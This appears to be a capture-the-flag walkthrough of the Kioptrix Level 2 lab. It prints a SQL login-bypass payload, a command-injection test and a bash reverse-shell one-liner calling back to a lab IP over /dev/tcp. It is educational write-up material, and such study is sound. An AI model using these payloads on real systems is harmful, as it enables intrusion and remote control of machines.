# Kioptrix Level 2 walk-through

### Initial portscan
----
- I always start with an initial port scan to see what ports are open.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/nmap_scan.png)

- ipp (internet printing protocol) port 631 was open, with version CUPS 1.1. I quickly searched with searchsploit and tried a quick python exploit but couldnt get it to work. There wasnt a lot of exploits available for that version so i decdided to move onto a more juicier port like 80.
--------
- Looking at the webserver on port 80, i tend to browse the website first, usually before or while i directory bruteforce. 
- At the main page it had a login form, so i had a feeling it was going to be a sql injection attack to gain remote access to the machine.
- Tried out a simple SQL auth bypass before i started diving into a more complicated SQL. Injection i tried `' OR 1=1 -- -` inside the username field, and password can be anything.

![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/Screenshot_2022-02-10_21-35-37.png)
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/SQL.png)

- Now theres a user input field and it says we can ping a machine on a network. So ill try to ping my attacker machine that im using.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/ping-screen.png)
- Looks like we can ping our own machine   
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/ping_test.png)

- So it looks like its using the OS ping command, which we can try to command stack using   `;  &&  ||`  to get a reverse shell
- Testing command stacking with the command `; id`
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/id_test.png)
----------
- lets try a reverse shell using bash. `; bash -i >& /dev/tcp/10.0.2.6/443 0>&1`
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_code.png)
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/bash_rev_shell.png)

- wooo! success we have a shell on the machine! we are apache user with low privileges so lets try to get root.
- from the previous image, we can see the kernal is 2.6.9-55. I usually like to look at the privileges the user has and what kernal version is running once i get access to the machine.
- I used searchsploit to search "kernel 2.6"....and there was a ton of exploits that poped up. I decided to see if i can find the OS to help me narrow it down.


- `uname -a` was not much help to determine OS type. So i used the command `cat  /etc/*-release`. 
- Its running CentOS 4.5
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/OS.png)

- Now i can use this info to narrow down my exploit search.
![alt text](https://github.com/pg-cy/CTF-Walkthrough/blob/main/kioptrix_level2/Images/searchsploit.png)


